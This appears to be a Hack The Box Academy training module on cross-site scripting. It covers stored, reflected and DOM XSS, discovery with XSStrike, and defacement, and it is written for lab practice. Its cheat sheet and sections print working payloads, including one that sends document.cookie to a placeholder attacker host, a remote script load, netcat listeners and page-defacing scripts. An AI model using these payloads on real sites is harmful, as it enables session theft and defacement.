@@ -1,0 +1,670 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+<h1 id="17-cross-site-scripting-xss-">17. Cross-Site Scripting (XSS)</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="commands">Commands</h3>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>XSS Payloads</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;plaintext&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;print()&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;img src="" onerror=alert(window.origin)&gt;</code></td>
+<td>HTML-based XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;</code></td>
+<td>Change Background Color</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;</code></td>
+<td>Change Background Image</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code></td>
+<td>Change Website Title</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code></td>
+<td>Overwrite website's main body</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code></td>
+<td>Remove certain HTML element</td>
+</tr>
+<tr>
+<td><code>&lt;script src="http://OUR_IP/script.js"&gt;&lt;/script&gt;</code></td>
+<td>Load remote script</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code></td>
+<td>Send Cookie details to us</td>
+</tr>
+<tr>
+<td><strong>Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</code></td>
+<td>Run <code>xsstrike</code> on a url parameter</td>
+</tr>
+<tr>
+<td><code>sudo nc -lvnp 80</code></td>
+<td>Start <code>netcat</code> listener</td>
+</tr>
+<tr>
+<td><code>sudo php -S 0.0.0.0:80</code></td>
+<td>Start <code>PHP</code> server</td>
+</tr>
+</tbody>
+</table>
+<h2 id="introduction">Introduction</h2>
+<p>As web applications become more advanced and more common, so do web application vulnerabilities. Among the most common types of web application vulnerabilities are <a href="https://owasp.org/www-community/attacks/xss/">Cross-Site Scripting (XSS)</a> vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.</p>
+<hr>
+<h3 id="what-is-xss">What is XSS</h3>
+<p>A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.</p>
+<p>XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (<code>low impact + high probability = medium risk</code>), which we should always attempt to <code>reduce</code> risk by detecting, remediating, and proactively preventing these types of vulnerabilities.</p>
+<p><img src="storage\modules\103\xss\_risk\_chart\_1.jpg" alt="xss risk"></p>
+<hr>
+<h3 id="xss-attacks">XSS Attacks</h3>
+<p>XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JavaScript code. A basic example of an XSS attack is having the target user unwittingly send their session cookie to the attacker's web server. Another example is having the target's browser execute API calls that lead to a malicious action, like changing the user's password to a password of the attacker's choosing. There are many other types of XSS attacks, from Bitcoin mining to displaying ads.</p>
+<p>As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerable website. Nevertheless, being able to execute JavaScript in a user's browser may still lead to a wide variety of attacks, as mentioned above. In addition to this, if a skilled researcher identifies a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome), they can utilize an XSS vulnerability to execute a JavaScript exploit on the target's browser, which eventually breaks out of the browser's sandbox and executes code on the user's machine.</p>
+<p>XSS vulnerabilities may be found in almost all modern web applications and have been actively exploited for the past two decades. A well-known XSS example is the <a href="https://en.wikipedia.org/wiki/Samy\_\(computer\_worm\">Samy Worm</a>), which was a browser-based worm that exploited a stored XSS vulnerability in the social networking website MySpace back in 2005. It executed when viewing an infected webpage by posting a message on the victim's MySpace page that read, "Samy is my hero." The message itself also contained the same JavaScript payload to re-post the same message when viewed by others. Within a single day, more than a million MySpace users had this message posted on their pages. Even though this specific payload did not do any actual harm, the vulnerability could have been utilized for much more nefarious purposes, like stealing users' credit card information, installing key loggers on their browsers, or even exploiting a binary vulnerability in user's web browsers (which was more common in web browsers back then).</p>
+<p>In 2014, a security researcher accidentally identified an <a href="https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html">XSS vulnerability</a> in Twitter's TweetDeck dashboard. This vulnerability was exploited to create a <a href="https://twitter.com/derGeruhn/status/476764918763749376">self-retweeting tweet</a> in Twitter, which led the tweet to be retweeted more than 38,000 times in under two minutes. Eventually, it forced Twitter to <a href="https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable">temporarily shut down TweetDeck</a> while they patched the vulnerability.</p>
+<p>To this day, even the most prominent web applications have XSS vulnerabilities that can be exploited. Even Google's search engine page had multiple XSS vulnerabilities in its search bar, the most recent of which was in <a href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">2019</a> when an XSS vulnerability was found in the XML library. Furthermore, the Apache Server, the most commonly used web server on the internet, once reported an <a href="https://blogs.apache.org/infra/entry/apache\_org\_04\_09\_2010">XSS Vulnerability</a> that was being actively exploited to steal user passwords of certain companies. All of this tells us that XSS vulnerabilities should be taken seriously, and a good amount of effort should be put towards detecting and preventing them.</p>
+<hr>
+<h3 id="types-of-xss">Types of XSS</h3>
+<p>There are three main types of XSS vulnerabilities:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Stored (Persistent) XSS</code></td>
+<td>The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)</td>
+</tr>
+<tr>
+<td><code>Reflected (Non-Persistent) XSS</code></td>
+<td>Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)</td>
+</tr>
+<tr>
+<td><code>DOM-based XSS</code></td>
+<td>Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)</td>
+</tr>
+</tbody>
+</table>
+<p>We will cover each of these types in the upcoming sections and work through exercises to see how each of them occurs, and then we will also see how each of them can be utilized in attacks.</p>
+<h2 id="stored-xss">Stored XSS</h2>
+<hr>
+<p>Before we learn how to discover XSS vulnerabilities and utilize them for various attacks, we must first understand the different types of XSS vulnerabilities and their differences to know which to use in each kind of attack.</p>
+<p>The first and most critical type of XSS vulnerability is <code>Stored XSS</code> or <code>Persistent XSS</code>. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.</p>
+<p>This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.</p>
+<p>We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple <code>To-Do List</code> app that we can add items to. We can try typing <code>test</code> and hitting enter/return to add a new item and see how the page handles it:</p>
+<p><img src="storage\modules\103\xss\_stored\_xss.jpg" alt=""></p>
+<p>As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.</p>
+<hr>
+<h3 id="xss-testing-payloads">XSS Testing Payloads</h3>
+<p>We can test whether the page is vulnerable to XSS with the following basic XSS payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">window</span>.origin)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:</p>
+<p><img src="storage\modules\103\xss\_stored\_xss\_alert.jpg" alt=""></p>
+<p>As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking page source by clicking [<code>CTRL+U</code>] or right-clicking and selecting <code>View Page Source</code>, and we should see our payload in the page source:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;div&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-unstyled"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"todo"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">window</span>.origin)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
+</code></pre>
+<p>Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p>
+<p>As some modern browsers may block the <code>alert()</code> JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <code>&lt;plaintext&gt;</code>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <code>&lt;script&gt;print()&lt;/script&gt;</code> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.</p>
+<p>To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a <code>Stored/Persistent XSS</code> vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.</p>
+<h2 id="reflected-xss">Reflected XSS</h2>
+<hr>
+<p>There are two types of <code>Non-Persistent XSS</code> vulnerabilities: <code>Reflected XSS</code>, which gets processed by the back-end server, and <code>DOM-based XSS</code>, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, <code>Non-Persistent XSS</code> vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.</p>
+<p><code>Reflected XSS</code> vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are <code>Non-Persistent</code>.</p>
+<p>We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar <code>To-Do List</code> app to the one we practiced with in the previous section. We can try adding any <code>test</code> string to see how it's handled:</p>
+<p><img src="storage\modules\103\xss\_reflected\_1.jpg" alt=""></p>
+<p>As we can see, we get <code>Task 'test' could not be added.</code>, which includes our input <code>test</code> as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click <code>Add</code>:</p>
+<p><img src="storage\modules\103\xss\_reflected\_2.jpg" alt=""></p>
+<p>Once we click <code>Add</code>, we get the alert pop-up:</p>
+<p><img src="storage\modules\103\xss\_stored\_xss\_alert.jpg" alt=""></p>
+<p>In this case, we see that the error message now says <code>Task '' could not be added.</code>. Since our payload is wrapped with a <code>&lt;script&gt;</code> tag, it does not get rendered by the browser, so we get empty single quotes <code>''</code> instead. We can once again view the page source to confirm that the error message includes our XSS payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;div&gt;<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-unstyled"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"todo"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding-left:25px"</span>&gt;</span>Task '<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">window</span>.origin)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>' could not be added.<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
+</code></pre>
+<p>As we can see, the single quotes indeed contain our XSS payload <code>'&lt;script&gt;alert(window.origin)&lt;/script&gt;'</code>.</p>
+<p>If we visit the <code>Reflected</code> page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed <code>Non-Persistent</code>.</p>
+<p><code>But if the XSS vulnerability is Non-Persistent, how would we target victims with it?</code></p>
+<p>This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox <code>Developer Tools</code> by clicking [<code>CTRL+I</code>] and selecting the <code>Network</code> tab. Then, we can put our <code>test</code> payload again and click <code>Add</code> to send it:</p>
+<p><img src="storage\modules\103\xss\_reflected\_network.jpg" alt=""></p>
+<p>As we can see, the first row shows that our request was a <code>GET</code> request. <code>GET</code> request sends their parameters and data as part of the URL. So, <code>to target a user, we can send them a URL containing our payload</code>. To get the URL, we can copy the URL from the URL bar in Firefox after sending our XSS payload, or we can right-click on the <code>GET</code> request in the <code>Network</code> tab and select <code>Copy&gt;Copy URL</code>. Once the victim visits this URL, the XSS payload would execute:</p>
+<p><img src="storage\modules\103\xss\_stored\_xss\_alert.jpg" alt=""></p>
+<h2 id="dom-xss">DOM XSS</h2>
+<hr>
+<p>The third and final type of XSS is another <code>Non-Persistent</code> type called <code>DOM-based XSS</code>. While <code>reflected XSS</code> sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the <code>Document Object Model (DOM)</code>.</p>
+<p>We can run the server below to see an example of a web application vulnerable to DOM XSS. We can try adding a <code>test</code> item, and we see that the web application is similar to the <code>To-Do List</code> web applications we previously used:</p>
+<p><img src="storage\modules\103\xss\_dom\_1.jpg" alt=""></p>
+<p>However, if we open the <code>Network</code> tab in the Firefox Developer Tools, and re-add the <code>test</code> item, we would notice that no HTTP requests are being made:</p>
+<p><img src="storage\modules\103\xss\_dom\_network.jpg" alt=""></p>
+<p>We see that the input parameter in the URL is using a hashtag <code>#</code> for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a <code>DOM-based XSS</code>.</p>
+<p>Furthermore, if we look at the page source by hitting [<code>CTRL+U</code>], we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. <code>Non-Persistent</code>). We can still view the rendered page source with the Web Inspector tool by clicking [<code>CTRL+SHIFT+C</code>]:</p>
+<p><img src="storage\modules\103\xss\_dom\_inspector.jpg" alt=""></p>
+<hr>
+<h3 id="source-sink">Source &amp; Sink</h3>
+<p>To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the <code>Source</code> and <code>Sink</code> of the object displayed on the page. The <code>Source</code> is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.</p>
+<p>On the other hand, the <code>Sink</code> is the function that writes the user input to a DOM Object on the page. If the <code>Sink</code> function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:</p>
+<ul>
+<li><code>document.write()</code></li>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+</ul>
+<p>Furthermore, some of the <code>jQuery</code> library functions that write to DOM objects are:</p>
+<ul>
+<li><code>add()</code></li>
+<li><code>after()</code></li>
+<li><code>append()</code></li>
+</ul>
+<p>If a <code>Sink</code> function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.</p>
+<p>We can look at the source code of the <code>To-Do</code> web application, and check <code>script.js</code>, and we will see that the <code>Source</code> is being taken from the <code>task=</code> parameter:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> pos = <span class="hljs-built_in">document</span>.URL.indexOf(<span class="hljs-string">"task="</span>);
+<span class="hljs-keyword">var</span> task = <span class="hljs-built_in">document</span>.URL.substring(pos + <span class="hljs-number">5</span>, <span class="hljs-built_in">document</span>.URL.length);
+</code></pre>
+<p>Right below these lines, we see that the page uses the <code>innerHTML</code> function to write the <code>task</code> variable in the <code>todo</code> DOM:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"todo"</span>).innerHTML = <span class="hljs-string">"&lt;b&gt;Next Task:&lt;/b&gt; "</span> + <span class="hljs-built_in">decodeURIComponent</span>(task);
+</code></pre>
+<p>So, we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.</p>
+<hr>
+<h3 id="dom-attacks">DOM Attacks</h3>
+<p>If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the <code>innerHTML</code> function does not allow the use of the <code>&lt;script&gt;</code> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <code>&lt;script&gt;</code> tags, like the following XSS payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(window.origin)</span>&gt;</span>
+</code></pre>
+<p>The above line creates a new HTML image object, which has a <code>onerror</code> attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (<code>""</code>), our code should always get executed without having to use <code>&lt;script&gt;</code> tags:</p>
+<p>'&gt;<img src="storage\modules\103\xss\_dom\_alert.jpg" alt=""></p>
+<p>To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads. There are many instances where we may need to use various payloads depending on the security of the web application and the browser, which we will discuss in the next section.</p>
+<h2 id="xss-discovery">XSS Discovery</h2>
+<hr>
+<p>By now, we should have a good understanding of what an XSS vulnerability is, the three types of XSS, and how each type differs from the others. We should also understand how XSS works through injecting JavaScript code into the client-side page source, thus executing additional code, which we will later learn how to utilize to our advantage.</p>
+<p>In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. In web application vulnerabilities (and all vulnerabilities in general), detecting them can become as difficult as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us in detecting and identifying them.</p>
+<hr>
+<h3 id="automated-discovery">Automated Discovery</h3>
+<p>Almost all Web Application Vulnerability Scanners (like <a href="https://www.tenable.com/products/nessus">Nessus</a>, <a href="https://portswigger.net/burp/pro">Burp Pro</a>, or <a href="https://www.zaproxy.org/">ZAP</a>) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually do two types of scanning: A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities, and an Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.</p>
+<p>While paid tools usually have a higher level of accuracy in detecting XSS vulnerabilities (especially when security bypasses are required), we can still find open-source tools that can assist us in identifying potential XSS vulnerabilities. Such tools usually work by identifying input fields in web pages, sending various types of XSS payloads, and then comparing the rendered page source to see if the same payload can be found in it, which may indicate a successful XSS injection. Still, this will not always be accurate, as sometimes, even if the same payload was injected, it might not lead to a successful execution due to various reasons, so we must always manually verify the XSS injection.</p>
+<p>Some of the common open-source tools that can assist us in XSS discovery are <a href="https://github.com/s0md3v/XSStrike">XSS Strike</a>, <a href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>, and <a href="https://github.com/epsylon/xsser">XSSer</a>. We can try <code>XSS Strike</code> by cloning it to our VM with <code>git clone</code>:</p>
+<p>XSS Discovery</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https:<span class="hljs-comment">//github.com/s0md3v/XSStrike.git</span>
+root@htb[/htb]$ cd XSStrike
+root@htb[/htb]$ pip install -r requirements<span class="hljs-selector-class">.txt</span>
+root@htb[/htb]$ python xsstrike<span class="hljs-selector-class">.py</span>
+
+XSStrike v3.<span class="hljs-number">1.4</span>
+..<span class="hljs-selector-class">.SNIP</span>...
+</code></pre>
+<p>We can then run the script and provide it a URL with a parameter using <code>-u</code>. Let's try using it with our <code>Reflected XSS</code> example from the earlier section:</p>
+<p>XSS Discovery</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python xsstrike.py -u <span class="hljs-string">"http://SERVER_IP:PORT/index.php?task=test"</span> 
+
+        <span class="hljs-symbol">XSStrike</span> v3<span class="hljs-number">.1</span><span class="hljs-number">.4</span>
+
+[~] <span class="hljs-symbol">Checking</span> for <span class="hljs-symbol">DOM</span> vulnerabilities 
+[+] <span class="hljs-symbol">WAF</span> <span class="hljs-symbol">Status</span>: <span class="hljs-symbol">Offline</span> 
+[!] <span class="hljs-symbol">Testing</span> parameter: task 
+[!] <span class="hljs-symbol">Reflections</span> found: <span class="hljs-number">1</span> 
+[~] <span class="hljs-symbol">Analysing</span> reflections 
+[~] <span class="hljs-symbol">Generating</span> payloads 
+[!] <span class="hljs-symbol">Payloads</span> generated: <span class="hljs-number">3072</span> 
+------------------------------------------------------------
+[+] <span class="hljs-symbol">Payload</span>: &lt;<span class="hljs-symbol">HtMl</span><span class="hljs-comment">%09onPoIntERENTER+=+confirm()&gt; </span>
+[!] <span class="hljs-symbol">Efficiency</span>: <span class="hljs-number">100</span> 
+[!] <span class="hljs-symbol">Confidence</span>: <span class="hljs-number">10</span> 
+[?] <span class="hljs-symbol">Would</span> you like to continue scanning? [y/<span class="hljs-symbol">N</span>]
+</code></pre>
+<p>As we can see, the tool identified the parameter as vulnerable to XSS from the first payload. <code>Try to verify the above payload by testing it on one of the previous exercises. You may also try testing out the other tools and run them on the same exercises to see how capable they are in detecting XSS vulnerabilities.</code></p>
+<hr>
+<h3 id="manual-discovery">Manual Discovery</h3>
+<p>When it comes to manual XSS discovery, the difficulty of finding the XSS vulnerability depends on the level of security of the web application. Basic XSS vulnerabilities can usually be found through testing various XSS payloads, but identifying advanced XSS vulnerabilities requires advanced code review skills.</p>
+<hr>
+<p><strong>XSS Payloads</strong></p>
+<p>The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md">PayloadAllTheThings</a> or the one in <a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>. We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.</p>
+<p>Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).</p>
+<p>You will notice that the majority of the above payloads do not work with our example web applications, even though we are dealing with the most basic type of XSS vulnerabilities. This is because these payloads are written for a wide variety of injection points (like injecting after a single quote) or are designed to evade certain security measures (like sanitization filters). Furthermore, such payloads utilize a variety of injection vectors to execute JavaScript code, like basic <code>&lt;script&gt;</code> tags, other <code>HTML Attributes</code> like <code>&lt;img&gt;</code>, or even <code>CSS Style</code> attributes. This is why we can expect that many of these payloads will not work in all test cases, as they are designed to work with certain types of injections.</p>
+<p>This is why it is not very efficient to resort to manually copying/pasting XSS payloads, as even if a web application is vulnerable, it may take us a while to identify the vulnerability, especially if we have many input fields to test. This is why it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. This can help us in advanced cases where XSS tools cannot easily send and compare payloads. This way, we would have the advantage of customizing our tool to our target web application. However, this is an advanced approach to XSS discovery, and it is not part of the scope of this module.</p>
+<hr>
+<h3 id="code-review">Code Review</h3>
+<p>The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.</p>
+<p>In the previous section, we looked at a basic example of HTML code review when discussing the <code>Source</code> and <code>Sink</code> for DOM-based XSS vulnerabilities. This gave us a quick look at how front-end code review works in identifying XSS vulnerabilities, although on a very basic front-end example.</p>
+<p>We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release. For such cases, manual code review may reveal undetected XSS vulnerabilities, which may survive public releases of common web applications. These are also advanced techniques that are out of the scope of this module. Still, if you are interested in learning them, the <a href="https://academy.hackthebox.com/course/preview/secure-coding-101-javascript">Secure Coding 101: JavaScript</a> and the <a href="https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection">Whitebox Pentesting 101: Command Injection</a> modules thoroughly cover this topic.</p>
+<h2 id="defacing">Defacing</h2>
+<hr>
+<p>Now that we understand the different types of XSS and various methods of discovering XSS vulnerabilities in web pages, we can start learning how to exploit these XSS vulnerabilities. As previously mentioned, the damage and the scope of an XSS attack depends on the type of XSS, a stored XSS being the most critical, while a DOM-based being less so.</p>
+<p>One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. <code>Defacing</code> a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it, like when hackers defaced the UK National Health Service (NHS) <a href="https://www.bbc.co.uk/news/technology-43812539">back in 2018</a>. Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.</p>
+<p>Although many other vulnerabilities may be utilized to achieve the same thing, stored XSS vulnerabilities are among the most used vulnerabilities for doing so.</p>
+<hr>
+<h3 id="defacement-elements">Defacement Elements</h3>
+<p>We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.</p>
+<p>Three HTML elements are usually utilized to change the main look of a web page:</p>
+<ul>
+<li>Background Color <code>document.body.style.background</code></li>
+<li>Background <code>document.body.background</code></li>
+<li>Page Title <code>document.title</code></li>
+<li>Page Text <code>DOM.innerHTML</code></li>
+</ul>
+<p>We can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.</p>
+<hr>
+<h3 id="changing-background">Changing Background</h3>
+<p>Let's go back to our <code>Stored XSS</code> exercise and use it as a basis for our attack. You can go back to the <code>Stored XSS</code> section to spawn the server and follow the next steps.</p>
+<p>To change a web page's background, we can choose a certain color or use an image. We will use a color as our background since most defacing attacks use a dark color for the background. To do so, we can use the following payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.body.style.background = <span class="hljs-string">"#141d2b"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like <code>= "black"</code>.</p>
+<p>Once we add our payload to the <code>To-Do</code> list, we will see that the background color changed:</p>
+<p><img src="storage\modules\103\xss\_defacing\_background\_color.jpg" alt=""></p>
+<p>This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.</p>
+<p>Another option would be to set an image to the background using the following payload:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.body.background = <span class="hljs-string">"https://www.hackthebox.eu/images/logo-htb.svg"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>Try using the above payload to see how the final result may look.</p>
+<hr>
+<h3 id="changing-page-title">Changing Page Title</h3>
+<p>We can change the page title from <code>2Do</code> to any title of our choosing, using the <code>document.title</code> JavaScript function:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.title = <span class="hljs-string">'HackTheBox Academy'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>We can see from the page window/tab that our new title has replaced the previous one:</p>
+<p><img src="storage\modules\103\xss\_defacing\_page\_title.jpg" alt=""></p>
+<hr>
